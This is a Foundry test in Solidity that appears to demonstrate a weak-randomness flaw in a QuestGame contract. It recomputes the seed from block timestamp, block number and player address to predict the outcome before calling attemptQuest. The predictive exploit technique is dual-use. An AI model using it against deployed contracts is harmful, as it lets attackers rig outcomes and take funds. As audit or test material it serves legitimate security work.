
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {
    QuestGame public questGame;

    function setUp() public {
        questGame = new QuestGame{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        // --- 1. Constraints ---
        blockTimestamp = blockTimestamp + 1 hours;
        blockNumber = blockNumber + 1;

        // --- 2. State Configuration ---
        address player = address(1);
        vm.deal(player, 1 ether);

        // --- 3. Replication & Assertion ---
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    blockTimestamp,
                    blockNumber,
                    player
                )
            )
        );
        uint256 expectedNumber = seed % 100;

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        questGame.attemptQuest{value: 0.1 ether}(expectedNumber);

        emit log_named_uint("Expected Number", expectedNumber);
        emit log_named_uint("Actual Number", questGame.players(player).wins());
    }
}
